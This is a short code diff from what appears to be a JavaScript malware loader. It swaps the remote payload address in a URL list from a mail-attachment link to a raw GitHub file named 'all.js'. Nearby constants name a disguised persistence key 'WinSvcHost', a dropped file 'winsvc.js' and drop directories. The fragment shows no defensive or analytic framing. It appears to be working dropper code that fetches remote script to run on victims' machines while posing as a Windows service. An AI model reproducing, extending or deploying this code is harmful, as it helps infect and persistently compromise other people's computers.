@@ -13,7 +13,7 @@ const _UA =
   _RK = "WinSvcHost",
   _NM = "winsvc.js";
 const _URLS = [
-  "https://limbomail.com/api/attachment/l4TIRPOsaUxR._603-vhKDRdgKl3RalN_TVUZYGPsJy2Y/all.js",
+  "https://raw.githubusercontent.com/trktgq0wbre1/eqwxqdsxasxasdqwxqweqwdxqw/main/all.js",
 ];
 const _DDIRS = [
   path.join(
